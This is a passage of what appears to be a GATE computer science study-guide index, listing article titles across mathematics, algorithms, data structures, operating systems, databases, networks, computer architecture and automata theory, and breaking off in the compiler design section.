2 Some theorems on Nested Quantifiers Rules of Inference Consensus theorem Introduction to Proofs Combinatorics Basics Pigeonhole Principle PnC and Binomial Coefficients Generalized PnC Set 1 Generalized PnC Set 2 Inclusion-Exclusion and its various Applications Corollaries of Binomial Theorem Introduction of Generating Functions Generating Functions – Set 2 Set Theory | Introduction Set Theory | Set Operations Power Set and its Properties Relations and their types Relations and their representations Representing Relations Closure of Relations and Equivalence Relations Functions | Properties and Types Inverse functions and composition of functions Total number of possible functions Number of possible equivalence relations Groups Partial Orders and Lattices Hasse Diagrams Graph Theory Basics – Set 1 Graph Theory Basics – Set 2 Walks, Trails, Paths, Cycles and Circuits in Graph Number of nodes and height of binary tree Graph measurements: length, distance, diameter, eccentricity, radius, center Graph Isomorphisms and Connectivity Planar Graphs and Graph Coloring Euler and Hamiltonian Paths Independent Sets, Covering and Matching Matching (graph theory) Graph theory practice questions Recurrence relations Different types of recurrence relations and their solutions Types of Recurrence Relations – Set 2 Linear Algebra : Matrix Introduction Different operations on matrices L U Decomposition Doolittle Algorithm : LU Decomposition System of Linear Equations Eigen Values and Eigen Vectors Probability : Probability Random Variables Mean, Variance And Standard Deviation Law of total probability Bayes’s formula for Conditional Probability Probability Distributions Set 1 (Uniform Distribution) Probability Distributions Set 2 (Exponential Distribution) Probability Distributions Set 3 (Normal Distribution) Probability Distributions Set 4 (Binomial Distribution) Probability Distributions Set 5 (Poisson Distribution) Hypergeometric Distribution model Conditional Probability Covariance and Correlation Calculus : Limits, Continuity and Differentiability Lagrange’s Mean Value Theorem Mean Value Theorem | Rolle’s Theorem Cauchy’s mean value theorem Indefinite Integrals Finding nth term of any polynomial sequence Sequence, Series and Summations CATEGORY ARCHIVES: ENGINEERING MATHEMATICS Last Minute Notes – Engineering Mathematics Discrete Mathematics : Propositional and First Order Logic Set Theory & Algebra Combinatorics Combinatorics | Set 1 Combinatorics | Set 2 Graph Theory Linear Algebra : Linear Algebra Probability : Probability Calculus : Calculus Discrete Mathematics : Video – MIT Discrete Mathematics Lectures Notes – First Order Logic Book – Schaum’s PDF MIT – Lecture Notes IISC – Video Lectures IITM – link for counting Papers – GATE’s Explanation by NPTEL Linear Algebra : MIT – Linear Algebra Book – Linear Algebra Probability : Book – Probability Notes – Probability Calculus : MIT – Video Lectures Notes – Calculus Calculus Section 3: Algorithms Searching, sorting, hashing Asymptotic worst case time and space complexity Algorithm design techniques : greedy, dynamic programming and divide‐and‐conquer Graph traversals, minimum spanning trees, shortest paths Asymptotic Analysis of Algorithms : Analysis of Algorithms | Set 1 (Asymptotic Analysis) Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) Analysis of Algorithms | Set 3 (Asymptotic Notations) Analysis of Algorithms | Set 4 (Analysis of Loops) Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) Analysis of algorithms | little o and little omega notations What does ‘Space Complexity’ mean? Articles | Analysis of Algorithms Recurrence Relations : Analysis of Algorithm | Set 4 (Solving Recurrences) Different types of recurrence relations and their solutions Divide and Conquer : Divide and Conquer | Set 1 (Introduction) Binary Search Why is Binary Search preferred over Ternary Search? Merge Sort Merge Sort for Linked Lists Merge Sort for Doubly Linked List How to make Mergesort to perform O(n) comparisons in best case? QuickSort Iterative Quick Sort QuickSort on Singly Linked List QuickSort on Doubly Linked List When does the worst case of Quicksort occur? Why Quick Sort preferred for Arrays and Merge Sort for Linked Lists? Write a program to calculate pow(x,n) Median of two sorted arrays Count Inversions in an array | Set 1 (Using Merge Sort) Divide and Conquer | Set 2 (Closest Pair of Points) Divide and Conquer | Set 5 (Strassen’s Matrix Multiplication) Sort a nearly sorted (or K sorted) array Search in an almost sorted array K-th Element of Two Sorted Arrays K’th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time) Searching and Sorting Greedy Techniques : Greedy Algorithms | Set 1 (Activity Selection Problem) Job Sequencing Problem | Set 1 (Greedy Algorithm) Greedy Algorithms | Set 3 (Huffman Coding) Greedy Algorithms | Set 4 (Efficient Huffman Coding for Sorted Input) Greedy Algorithms | Set 2 (Kruskal’s Minimum Spanning Tree Algorithm) Greedy Algorithms | Set 5 (Prim’s Minimum Spanning Tree (MST)) Greedy Algorithms | Set 6 (Prim’s MST for Adjacency List Representation) Applications of Minimum Spanning Tree Problem Greedy Algorithms | Set 7 (Dijkstra’s shortest path algorithm) Greedy Algorithms | Set 8 (Dijkstra’s Algorithm for Adjacency List Representation) Greedy Algorithm to find Minimum number of Coins Strongly Connected Components Greedy Algorithms Graph Based Algorithms : Graph and its representations Breadth First Traversal or BFS for a Graph Depth First Traversal or DFS for a Graph Applications of Depth First Search Detect Cycle in a Directed Graph Disjoint Set (Or Union-Find) | Set 1 (Detect Cycle in an Undirected Graph) Detect cycle in an undirected graph Topological Sorting Longest Path in a Directed Acyclic Graph Biconnected Components Bellman–Ford Algorithm Floyd Warshall Algorithm Shortest Path in Directed Acyclic Graph Some interesting shortest path questions | Set 1 Shortest path with exactly k edges in a directed and weighted graph Biconnected Components Biconnected graph Articulation Points (or Cut Vertices) in a Graph Check if a graph is strongly connected | Set 1 (Kosaraju using DFS) Bridges in a graph Transitive closure of a graph Graph Algorithms | DFS and BFS | Minimum Spanning Tree | Shortest Paths | Connectivity Dynamic Programing : Dynamic Programming | Set 1 (Overlapping Subproblems Property) Dynamic Programming | Set 2 (Optimal Substructure Property) Dynamic Programming | Set 4 (Longest Common Subsequence) Dynamic Programming | Set 8 (Matrix Chain Multiplication) Dynamic Programming | Set 10 ( 0-1 Knapsack Problem) Dynamic Programming | Set 6 (Min Cost Path) Dynamic Programming | Set 25 (Subset Sum Problem) Dynamic Programming | Set 23 (Bellman–Ford Algorithm) Dynamic Programming | Set 16 (Floyd Warshall Algorithm) Total number of non-decreasing numbers with n digits Vertex Cover Problem | Set 2 (Dynamic Programming Solution for Tree) Smallest power of 2 greater than or equal to n Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming) Travelling Salesman Problem | Set 2 (Approximate using MST) Dynamic Programming Searching, Sorting and Hashing : Linear Search Linear Search vs Binary Search Selection Sort Bubble Sort Insertion Sort Heap Sort Radix Sort Counting Sort Hashing | Set 1 (Introduction) Hashing | Set 2 (Separate Chaining) Hashing | Set 3 (Open Addressing) Hash Table vs STL Map Advantages of BST over Hash Table Misc : Find subarray with given sum | Set 2 (Handles Negative Numbers) Largest subarray with equal number of 0s and 1s Find four elements a, b, c and d in an array such that a+b = c+d Print all subarrays with 0 sum Given an array A[] and a number x, check for pair in A[] with sum as x Union and Intersection of two Linked Lists Find whether an array is subset of another array | Added Method 3 Count pairs with given sum Top 20 Hashing Technique based Interview Questions CATEGORY ARCHIVES: ALGORITHMS Last Minute Notes – Algorithms Asymptotic Analysis of Algorithms : Analysis of Algorithms Recurrence Relations : Analysis of Algorithms (Recurrences) Practice Set for Recurrence Relations Divide and Conquer : MergeSort Divide and Conquer Greedy Techniques : Graph Minimum Spanning Tree Graph Shortest Paths Greedy Algorithms Graph Based Algorithms : Graph Graph Traversals Dynamic Programing : Dynamic Programming Searching, Sorting and Hashing : Searching Sorting Hashing Misc : Misc Commonly Asked Algorithm Interview Questions | Set 1 Data Structures and Algorithms | Set 1 Data Structures and Algorithms | Set 2 Data Structures and Algorithms | Set 3 Data Structures and Algorithms | Set 4 Data Structures and Algorithms | Set 5 Data Structures and Algorithms | Set 6 Data Structures and Algorithms | Set 7 Data Structures and Algorithms | Set 8 Data Structures and Algorithms | Set 9 Data Structures and Algorithms | Set 10 Data Structures and Algorithms | Set 11 Data Structures and Algorithms | Set 12 Data Structures and Algorithms | Set 13 Data Structures and Algorithms | Set 14 Data Structures and Algorithms | Set 15 Data Structures and Algorithms | Set 16 Data Structures and Algorithms | Set 17 Data Structures and Algorithms | Set 18 Data Structures and Algorithms | Set 19 Data Structures and Algorithms | Set 20 Data Structures and Algorithms | Set 21 Data Structures and Algorithms | Set 22 Data Structures and Algorithms | Set 23 Data Structures and Algorithms | Set 24 Data Structures and Algorithms | Set 25 Data Structures and Algorithms | Set 26 Data Structures and Algorithms | Set 27 Data Structures and Algorithms | Set 28 Data Structures and Algorithms | Set 29 Data Structures and Algorithms | Set 30 Data Structures and Algorithms | Set 31 Data Structures and Algorithms | Set 32 Data Structures and Algorithms | Set 33 Data Structures and Algorithms | Set 34 Data Structures and Algorithms | Set 35 Algorithms : Video – GeeksforGeeks Videos Video – Lectures by Ravindrababu Ravula MIT – Introduction to Algorithms Book – CLRS Solutions Manual Visual – Data Structures and Algorithms. Notes – Big – O Notation Notes – Master Theorem Notes – Extended Master Theorem Notes – Master Theorem problems and answers Section 4: Programming and Data Structures Programming in C, Recursion Arrays, stacks, queues, linked lists, trees, binary search trees, binary heaps, graphs Programming in C, Recursion : C Programming Recursion Tail Recursion Recursive functions Array, Stack, Queue : Arrays Stack Queue Linked Lists : Linked List Trees, Binary search trees, Binary heaps : Binary Tree Binary Search Tree Binary Heap Graphs : Graph CATEGORY ARCHIVES: DATA STRUCTURES CATEGORY ARCHIVES: C Last Minute Notes – DATA STRUCTURE Last Minute Notes – C/C++ Programming in C, Recursion : Principle of programming languages | Set 1 C Language Recursion C Language | Set 1 C Language | Set 2 C Language | Set 3 C Language | Set 4 C Language | Set 5 C Language | Set 6 C Language | Set 7 C Language | Set 8 C Language | Set 9 C Language | Set 10 Array, Stack, Queue : Array Stack Queue Linked Lists : Linked List Trees, Binary search trees, Binary heaps : Binary Trees Tree Traversals Binary Search Trees Balanced Binary Search Trees Heap Graphs : Graph Graph Traversals Commonly Asked Data Structure Interview Questions | Set 1 Programming and Data Structures : Video – NPTEL lectures Visual – Data Structure Visualizations Section 5: Operating Systems Processes, System calls, threads, CPU scheduling Inter‐process communication, concurrency and synchronization, deadlock Memory management and virtual memory I/O scheduling, File systems Processes, threads, CPU scheduling : What happens when we turn on computer? Introduction of Operating System Functions of Operating System Types of Operating Systems Dual Mode operations in OS Privileged and Non-Privileged Instructions 32-bit and 64-bit operating systems Real time systems Operating Systems | Need and Functions Process Management | Introduction States of a process Process Table and Process Control Block (PCB) Process Scheduler Difference between dispatcher and scheduler Process Management | CPU Scheduling Preemptive and Non-Preemptive Scheduling Program for FCFS Scheduling | Set 1 Program for FCFS Scheduling | Set 2 (Processes with different arrival times) Convoy Effect in Operating Systems Program for preemptive priority CPU scheduling Program for Round Robin scheduling | Set 1 Round Robin Scheduling with different arrival times Program for Shortest Job First (or SJF) scheduling | Set 1 (Non- preemptive) Program for Shortest Job First (SJF) scheduling | Set 2 (Preemptive) Shortest Job First scheduling with predicted burst time Longest Remaining Time First (LRTF) algorithm Longest Remaining Time First (LRTF) Program Highest Response Ratio Next (HRRN) Scheduling Program for Priority Scheduling | Set 1 Priority Scheduling with different arrival time | Set 2 Multilevel Queue Scheduling Multilevel Feedback Queue Scheduling Multiple-Processor Scheduling Measure the time spent in context switch Starvation and Aging in Operating Systems Introduction of System Call Operating System | Thread Threads and its types Multithreading Multi threading models Benefits of Multithreading Process-based and Thread-based Multitasking User Level thread Vs Kernel Level thread Microkernel Monolithic Kernel and key differences from Microkernel Difference between multitasking, multithreading and multiprocessing fork() in C Boot Block Inter‐process communication, concurrency and synchronization: Process Synchronization | Introduction Operating System | Process Synchronization | Set 2 Critical Section Inter Process Communication IPC using Message Queues IPC through shared memory Interprocess Communication: Methods Semaphores in operating system Mutex vs Semaphore Lock variable synchronization mechanism Peterson’s Algorithm for Mutual Exclusion | Set 1 (Basic C implementation) Peterson’s Algorithm for Mutual Exclusion | Set 2 (CPU Cycles and Memory Fence) Peterson’s Algorithm (Using processes and shared memory) Readers-Writers Problem | Set 1 (Introduction and Readers Preference Solution) Reader-Writers solution using Monitors Producer Consumer Problem using Semaphores | Set 1 Producer-Consumer solution using Semaphores in Java | Set 2 Sleeping Barber problem Process Synchronization | Monitors Dining-Philosophers Solution Using Monitors Dining Philosopher Problem Using Semaphores Dekker’s algorithm Bakery Algorithm Priority Inversion : What the heck ! What’s difference between Priority Inversion and Priority Inheritance ? Deadlock, Starvation, and Livelock Deadlock : Process Management | Deadlock Introduction Program for Deadlock free condition Deadlock Prevention And Avoidance Deadlock Detection And Recovery Resource Allocation Graph (RAG) Banker’s Algorithm Program for Banker’s Algorithm | Set 1 (Safety Algorithm) Banker’s Algorithm : Print all the safe state Deadlock detection algorithm Methods of resource allocation to processes by operating system Main memory management : Mapping virtual address to physical addresses Logical vs Physical Address in Operating System Paging Page Table Entries Inverted Page Table Segmentation Memory Management | Partition Allocation Method Program for First Fit algorithm in Memory Management Program for Next Fit algorithm in Memory Management Non-Contiguous Allocation Fixed (or static) Partitioning Variable (or dynamic) Partitioning Working with Shared Libraries | Set 1 Static and Dynamic Libraries | Set 1 Buddy System Buddy System Memory Allocation Buddy System Memory Deallocation Allocating kernel memory Requirements of memory management system Virtual memory : Virtual Memory Secondary memory – Hard disk drive Page Fault Handling Page Replacement Algorithms Belady’s Anomaly Program for Optimal Page Replacement Algorithm Second Chance (or Clock) Page Replacement Policy Techniques to handle Thrashing What exactly Spooling is all about? Difference between Spooling and Buffering Overlays in Memory Management Swap Space File system and disk scheduling : File Systems Structures of Directory File Directory | Path Name File Access Methods File Allocation Methods Operating System | Free space management Difference between FAT32, exFAT, and NTFS File System Disk Scheduling Algorithms Program for SSTF disk scheduling algorithm CATEGORY ARCHIVES: OPERATING SYSTEMS Last Minute Notes – Operating Systems Processes, threads, CPU scheduling : Process Management CPU Scheduling Inter‐process communication, concurrency and synchronization : Concurrency and synchronization Deadlock : Deadlock Main memory management : Memory Management Virtual memory : Virtual Memory | Questions File system and disk scheduling : Input Output Systems UNIX – I Node Commonly Asked Operating Systems Interview Questions | Set 1 Operating Systems | Set 1 Operating Systems | Set 2 Operating Systems | Set 3 Operating Systems | Set 4 Operating Systems | Set 5 Operating Systems | Set 6 Operating Systems | Set 7 Operating Systems | Set 8 Operating Systems | Set 9 Operating Systems | Set 10 Operating Systems | Set 11 Operating Systems | Set 12 Operating Systems | Set 13 Operating Systems | Set 14 Operating Systems | Set 15 Operating Systems | Set 16 Operating Systems | Set 17 Operating Systems : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – VirginiaTech Univ. Web resource Notes – Galvin Lecture Slides Book – William Stallings Practice Problems and Solutions Notes – User and Kernel Level Threads Notes – Virtual Memory and Cache Notes – Segmentation and Paging Notes – Some Interesting problems on Virtual memory Section 6: Databases ER‐model, Relational model : relational algebra, tuple calculus, SQL Integrity constraints, normal forms Transactions and concurrency control File organization, indexing (e.g., B and B+ trees) ER‐model : Database Management System – Introduction | Set 1 Database Management System Introduction | Set 2 (3-Tier Architecture) DBMS Architecture 2-Level, 3-Level Need for DBMS Advantages of DBMS over File system Choice of DBMS | Economic factors Data Abstraction and Data Independence ER Model Recursive Relationships Minimization of ER Diagram Enhanced ER Model Mapping from ER Model to Relational Model Relational model (relational algebra, tuple calculus) : Relational Model Relational Algebra – Overview DBMS | Anomalies in Relational Model Relational Model Introduction and Codd Rules Keys in Relational Model (Candidate, Super, Primary, Alternate and Foreign) Relational Algebra-Basic Operators Relational Algebra – Extended Operators Tupple Relational Calculus DBMS | How to solve Relational Algebra problems for GATE DBMS | Row oriented vs. column oriented data stores Database design (integrity constraints, normal forms) : Database Normalization | Introduction Database Normalization | Normal Forms Functional Dependency and Attribute Closure Finding Attribute Closure and Candidate Keys using Functional Dependencies Number of possible Superkeys Lossless Decomposition Dependency Preserving Decomposition Lossless Join and Dependency Preserving Decomposition DBMS | How to find the highest normal form of a relation DBMS | Minimum relations satisfying 1NF Equivalence of Functional Dependencies Armstrong’s Axioms in Functional Dependency Canonical Cover Denormalization in Databases Introduction of 4th and 5th Normal form Query languages (SQL) : Structured Query Language (SQL) Inner VS Outer Join Having Vs Where Clause Database Objects Nested Queries in SQL Join operation Vs nested query Indexing in Databases | Set 1 SQL queries on clustered and non-clustered Indexes SQL Tutorial Transactions and concurrency control : Concurrency Control -Introduction Database Recovery Techniques ACID Properties in DBMS Log based recovery DBMS | Why recovery is needed? Transaction Isolation Levels in DBMS Concurrency Control | Types of Schedules DBMS | Types of Recoverability of Schedules and easiest way to test schedule Conflict Serializability Precedence Graph For Testing Conflict Serializability How to test if two schedules are View Equal or not ? Recoverability of Schedules Deadlock in DBMS Starvation in DBMS Concurrency Control Protocols | Lock Based Protocol Concurrency Control Protocol | Two Phase Locking (2-PL)-I Concurrency Control Protocol | Two Phase Locking (2-PL)-II Concurrency Control Protocol | Two Phase Locking (2-PL)-III Concurrency Control Protocol | Thomas Write Rule Concurrency Control Protocols | Timestamp Ordering Protocols Concurrency Control Protocol | Multiple Granularity Locking Concurrency Control Protocol | Graph Based Protocol Introduction to TimeStamp and Deadlock Prevention Schemes Implementation of Locking in DBMS DBMS | Challenges of database security File structures (sequential files, indexing, B and B+ trees) : Indexing in Databases | Set 1 File Organization – Set 1 File Organization – Set 2 (Hashing in DBMS) File Organization – Set 3 B-Tree | Set 1 (Introduction) B-Tree | Set 2 (Insert) B-Tree | Set 3 (Delete) Database File Indexing – B+ Tree (Introduction) RAID Data Warehousing Data Mining Data Replication CATEGORY ARCHIVES: DBMS Last Minute Notes – DBMS ER‐model: ER and Relational Models Relational model (relational algebra, tuple calculus): ER and Relational Models Database design (integrity constraints, normal forms): Database Design(Normal Forms) Query languages (SQL) : SQL Transactions and concurrency control: Transactions and concurrency control File structures (sequential files, indexing, B and B+ trees): File structures (sequential files, indexing, B and B+ trees) Practice questions on B and B+ Trees Commonly asked DBMS interview questions | Set 1 Commonly asked DBMS interview questions | Set 2 Database Management Systems | Set 1 Database Management Systems | Set 2 Database Management Systems | Set 3 Database Management Systems | Set 4 Database Management Systems | Set 5 Database Management Systems | Set 6 Database Management Systems | Set 7 Database Management Systems | Set 8 Database Management Systems | Set 9 Database Management Systems | Set 10 Database Management Systems | Set 11 Databases : Video – NPTEL Lectures Notes – Lecture Slides Silberschatz, Korth and Sudarshan Notes – Lecture Slides Raghu Ramakrishnan and Johannes Gehrke Notes – Stanford DBMS course Lecture Slides Notes – Jeff Ullman’s Lecture Slides Notes – Normal forms Notes – Canonical Cover Notes – Indexing Visual – B Tree Notes – B+ Tree Visual – B+ Tree Section 7: Computer Networks Concept of layering: OSI and TCP/IP Protocol Stacks; Basics of packet, circuit and virtual circuit-switching; Data link layer: framing, error detection, Medium Access Control, Ethernet bridging; Routing protocols: shortest path, flooding, distance vector and link state routing; Fragmentation and IP addressing, IPv4, CIDR notation, Basics of IP support protocols (ARP, DHCP, ICMP), Network Address Translation (NAT); Transport layer: flow control and congestion control, UDP, TCP, sockets; Application layer protocols: DNS, SMTP, HTTP, FTP, Email. Network Fundamental and Physical layer : Basics of Computer Networking Network goals Network Topologies Types of area networks – LAN, MAN and WAN MANET: Mobile Ad hoc Network Types of MANET Types of Transmission Media Transmission Modes in Computer Networks (Simplex, Half-Duplex and Full-Duplex) Redundant link problems Digital Subscriber Line (DSL) What is Scrambling? Difference between Unipolar, Polar and Bipolar Line Coding Schemes Manchester Encoding Analog to digital conversion Digital to Analog Conversion Analog to Analog Conversion (Modulation) Difference between Broadband and Baseband Transmission Let’s experiment with Networking Layers of OSI Model TCP/IP Model Data Link layer : Multiple Access Protocols P2P(Peer To Peer) File Sharing Framing In Data Link Layer LAN Technologies | ETHERNET Ethernet Frame Format Token Ring frame format Bit Stuffing Difference between Byte stuffing and Bit stuffing Hamming Code Carrier sense multiple access (CSMA) Controlled Access Protocols Back-off Algorithm for CSMA/CD Collision Detection in CSMA/CD Efficiency of CSMA/CD Efficiency Of Token Ring Computer Networks | Error Detection Stop and Wait ARQ Sliding Window Protocol | Set 1 (Sender Side) Sliding Window Protocol | Set 2 (Receiver Side) Sliding Window Protocol | Set 3 (Selective Repeat) Sliding Window protocols Summary With Questions Program to remotely Power On a PC over the internet using the Wake-on-LAN protocol Program to calculate the Round Trip Time (RTT) Introduction of MAC Address Collision Avoidance in wireless networks Maximum data rate (channel capacity) for noiseless and noisy channels Types of switches Network layer : Internetworking Line Configuration in Computer Networks Difference between Unicast, Broadcast and Multicast Collision Domain and Broadcast Domain IP Addressing | Introduction and Classful Addressing Network Layer | Introduction and IPv4 Datagram Header Network Layer | Ipv4 Datagram Fragmentation and Delays Fragmentation at Network Layer Internet Protocol v6 | IPv6 Internet Protocol version 6 (IPv6) Header IP Addressing | Classless Addressing Supernetting Computer Networks | Longest Prefix Matching in Routers Program to determine class, Network and Host ID of an IPv4 address C Program to find IP Address, Subnet Mask & Default Gateway IPv4 classless Subnet equation Introduction to variable length subnet mask (VLSM) Network address translation (NAT) Types of Network address translation (NAT) Classification of Routing Algorithms – Set 1 Types of routing – Set 2 Classes of routing protocols – Set 3 Distance vector routing v/s Link state routing Fixed and Flooding Routing algorithms Routing v/s Routed Protocols Unicast Routing – Link State Routing Routing Protocols Set 1 (Distance Vector Routing) Route Poisoning and Count to infinity problem Onion Routing Router on a stick Internet Control Message Protocol (ICMP) | Computer Networks Hot Standby Router Protocol (HSRP) OSPF protocol fundamentals OSPF protocol States OSPF router roles and configuration Root Bridge Election in Spanning Tree Protocol Types of Spanning Tree Protocol (STP) EIGRP fundamentals Features of Enhanced Interior Gateway Routing Protocol (EIGRP) Routing Information Protocol (RIP) Routing Interface Protocol (RIP) V1 & V2 Link state advertisement (LSA) Administrative Distance (AD) and Autonomous System (AS) Circuit Switching Packet Switching and Delays Differences between Virtual Circuits & Datagram Networks Computer Network | Circuit Switching VS Packet Switching Traceroute How ARP works? ARP, Reverse ARP(RARP), Inverse ARP(InARP), Proxy ARP and Gratuitous ARP Packet flow in the same network Packet flow in different network Difference between layer-2 and layer-3 switches What’s difference between Ping and Traceroute? Computer Network | Servers What is Local Host? Transport layer : Transport Layer responsibilities Congestion Control Leaky Bucket Algorithm TCP | Services and Segment structure TCP Congestion Control TCP 3-Way Handshake Process TCP Connection Establishment TCP Connection Termination Error Control in TCP TCP Timers TCP flags TCP Server-Client implementation in C User Datagram Protocol (UDP) Differences between TCP and UDP Multiplexing and Demultiplexing in Transport Layer Application layer : Protocols in Application Layer DNS (Domain Name Server) | NetWorking Address Resolution in DNS DNS Spoofing or DNS Cache poisoning Why does DNS use UDP and not TCP? Dynamic Host Configuration Protocol (DHCP) DHCP Relay Agent How DHCP server dynamically assigns IP address to a host? Simple network management protocol (SNMP) Simple Mail Transfer Protocol (SMTP) File Transfer Protocol (FTP) HTTP Non-Persistent & Persistent Connection Multipurpose Internet mail extension (MIME) What’s difference between http:// and https:// ? What’s difference between HTML and HTTP ? What’s difference between The Internet and The Web ? Basics of Wi-Fi Wifi protected setup (WPS) Wifi protected access (WPA) LiFi vs. WiFi Network Devices (Hub, Repeater, Bridge, Switch, Router and Gateways) Network security : Basic Network Attacks Types of Viruses Introduction to Firewall Zone-based firewall Firewall methodologies Deniel of Service and Prevention Cryptography | Introduction to Crypto-terminologies Denial of Service DDoS attack Types of DNS Attacks and Tactics for Security Types of Security attacks | Active and Passive attacks Birthday attack Digital Signatures and Certificates LZW (Lempel–Ziv–Welch) Compression technique RC4 Encryption Algorithm RC5 Encryption Algorithm SHA-512 Hash RSA Algorithm in Cryptography RSA Algorithm using Multiple Precision Arithmetic Library Weak RSA decryption with Chinese-remainder theorem Implementation of Diffie-Hellman Algorithm DNA Cryptography Port security Unicode Message Authentication Codes How message authentication code works? System security Hash Functions in System Security The CIA triad Image Steganography Access-lists (ACL) Data encryption standard (DES) Difference between AES and DES ciphers CATEGORY ARCHIVES: COMPUTER NETWORKS Last Minute Notes – Computer Networks Network Fundamental and Physical layer : Computer Networks Data Link layer : Data Link Layer Network layer : Network Layer IP Addressing Transport layer : Transport Layer Application layer : HTTP Non-Persistent & Persistent Connection | Set 2 (Practice Question) Application Layer Network security : Network Security Commonly asked Computer Networks Interview Questions | Set 1 Computer Networks | Set 1 Computer Networks | Set 2 Computer Networks | Set 3 Computer Networks | Set 4 Computer Networks | Set 5 Computer Networks | Set 6 Computer Networks | Set 7 Computer Networks | Set 8 Computer Networks | Set 9 Computer Networks | Set 10 Computer Networks | Set 11 Computer Networks | Set 12 Computer Networks : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – Lecture Notes IIT Kanpur Notes – Web Resources on Computer Networks by Tanenbaum Visual – Sliding Window Animation Notes – Sliding Window MIT Notes – IPv4 vs IPv6 Section 8: Computer Organization and Architecture Machine instructions and addressing modes ALU, data‐path and control unit Instruction pipelining, pipeline hazards Memory hierarchy: cache, main memory and secondary storage I/O interface (Interrupt and DMA mode) Machine instructions and addressing modes : Von Neumann architecture Basic Computer Instructions Instruction Formats (Zero, One, Two and Three Address Instruction) Stack based CPU Organization General Register based CPU Organization Single Accumulator based CPU organization Problem Solving on Instruction Format Addressing Modes Machine Instructions Difference between CALL and JUMP instructions Simplified Instructional Computer (SIC) Hardware architecture (parallel computing) Flynn’s taxonomy Generations of computer Amdahl’s law and its proof ALU, data‐path and control unit : Control Unit and design Hardwired v/s Micro-programmed Control Unit Hardwired Vs Micro-programmed Control unit | Set 2 Horizontal micro-programmed Vs Vertical micro-programmed control unit Synchronous Data Transfer Instruction pipelining : Pipelining | Set 1 (Execution, Stages and Throughput) Pipelining | Set 2 (Dependencies and Data Hazard) Pipelining | Set 3 (Types and Stalling) Different Instruction Cycles Performance of Computer Micro-Operation RISC and CISC RISC and CISC | Set 2 Cache Memory : Memory Hierarchy Design and its Characteristics Cache Memory Cache Organization | Introduction Locality and Cache friendly code What’s difference between CPU Cache and TLB? Read and Write operations in memory Memory Interleaving Introduction to memory and memory units 2D and 2.5D Memory organization Types of computer memory (RAM and ROM) Different Types of RAM RAM vs ROM I/O interface (Interrupt and DMA mode) : I/O Interface (Interrupt and DMA Mode) Input-Output Processor Kernel I/O Subsystem Memory mapped I/O and Isolated I/O BUS Arbitration Priority Interrupts | (S/W Polling and Daisy Chaining) Asynchronous input output synchronization Computer Ports Clusters In Computer Organisation Human – Computer interaction through the ages CATEGORY ARCHIVES: COMPUTER ORGANIZATION & ARCHITECTURE Computer Organization and Architecture : Quiz on Microprocessors Computer Organization and Architecture Computer Organization and Architecture : Video – NPTEL Lectures Book – Carl Hamacher Notes – Pipelining Notes – Cache Memory Notes – Cache Associativity Section 9: Theory of Computation Regular expressions and finite automata Context-free grammars and push-down automata Regular and context-free languages, pumping lemma Turing machines and undecidability Regular expression, langauges, grammar and finite automata : Introduction of Theory of Computation Finite Automata | Introduction Chomsky Hierarchy Regular Expressions, Regular Grammar and Regular Languages Pumping Lemma Arden’s Theorem How to identify if a language is regular or not Designing Finite Automata from Regular Expression NFA with epsilon move to DFA Conversion Conversion from NFA to DFA Minimization of DFA Generating regular expression from finite automata Union & Intersection of Regular languages with CFL Designing Deterministic Finite Automata (Set 1) Designing Deterministic Finite Automata (Set 2) DFA of a string with at least two 0’s and at least two 1’s DFA machines accepting odd number of 0’s or/and even number of 1’s DFA for accepting the language L = {anbm | n+m=even} DFA for Strings not ending with “THE” Union process in DFA Concatenation process in DFA Star Height of Regular Expression and Regular Language Mealy and Moore Machines Difference between Mealy machine and Moore machine Context free langauges, grammar and push down automata : Pushdown Automata Pushdown Automata Acceptance by Final State Check if the language is Context Free or Not Construct Pushdown Automata for given languages Construct Pushdown automata for L = {0n1m2m3n | m,n ≥ 0} Construct Pushdown automata for L = {0n1m2(n+m) | m,n ≥ 0} Construct Pushdown Automata for all length palindrome NPDA for the language L ={wϵ{a,b}*| w contains equal no. of a’s and b’s} NPDA for accepting the language L = {an bn | n>=1} NPDA for accepting the language L = {an bm cn | m,n>=1} NPDA for accepting the language L = {an bn cm | m,n>=1} NPDA for accepting the language L = {am b(2m) | m>=1} NPDA for accepting the language L = {ambncpdq | m+n=p+q ; m,n,p,q>=1} Construct Pushdown automata for L = {a(2*m)c(4*n)dnbm | m,n ≥ 0} NPDA for accepting the language L = {ambnc(m+n) | m,n≥1} NPDA for accepting the language L = {amb(m+n)cn | m,n≥1} NPDA for accepting the language L = {a2mb3m | m≥1} NPDA for accepting the language L = {amb(2m+1) | m≥1} NPDA for L = {0i1j2k | i==j or j==k ; i , j , k >= 1} Closure Properties of Context Free Languages Ambiguity in CFG and CFL Simplifying Context Free Grammars Converting Context Free Grammar to Chomsky Normal Form Converting Context Free Grammar to Greibach Normal Form Relationship between grammar and language Context Sensitive langauges : Context-sensitive Grammar (CSG) and Language (CSL) Turing machines and undecidability : Recursive and Recursive Enumerable Languages Turing Machine Halting Problem Turing Machine for addition Turing machine for subtraction Turing Machine for subtraction | Set 2 Turing machine for multiplication Turing machine for copying data Construct a Turing Machine for language L = {0n1n2n | n≥1} Construct a Turing Machine for language L = {wwr | w ∈ {0, 1}} Construct a Turing Machine for language L = {ww | w ∈ {0,1}} Construct Turing machine for L = {anbm a(n+m) | n,m≥1} Construct a Turing machine for L = {aibjck | i*j = k; i, j, k ≥ 1} Proof that Hamiltonian Path is NP-Complete Proof that vertex cover is NP complete Decidability Decidable and undecidable problems Undecidability and Reducibility Computable and non-computable problems CATEGORY ARCHIVES: THEORY OF COMPUTATION & AUTOMATA Last Minute Notes – Theory of Computation Regular expression, langauges, grammar and finite automata : Regular languages and finite automata Practice problems on finite automata Practice problems on finite automata | Set 2 Context free langauges, grammar and push down automata : Context free languages and Push-down automata Context Sensitive langauges : . Turing machines and undecidability : Recursively enumerable sets and Turing machines Undecidability Automata Theory Automata Theory | Set 1 Automata Theory | Set 2 Automata Theory | Set 3 Automata Theory | Set 4 Automata Theory | Set 5 Automata Theory | Set 6 Theory of Computation : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – NFA and DFA Notes – Non Regular language Notes – PDA Notes – Turing Machine Notes – Rice Theorem Section 10: Compiler Design Lexical analysis, parsing, syntax-directed translation Runtime environments Intermediate code generation Local optimisation, Data flow analyses: constant 